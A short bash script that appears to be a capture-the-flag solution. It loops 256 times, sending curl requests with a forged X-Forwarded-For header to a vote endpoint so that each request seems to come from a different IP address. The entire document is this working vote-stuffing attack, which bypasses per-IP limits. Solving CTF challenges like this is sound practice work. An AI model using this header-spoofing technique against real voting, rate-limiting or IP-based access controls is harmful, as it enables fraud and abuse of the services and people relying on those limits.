for i in $(seq 0 255);
do
  curl --header "X-Forwarded-For: 192.$i.0.0" http://mics-ctf.com:8102/vote/3E
done
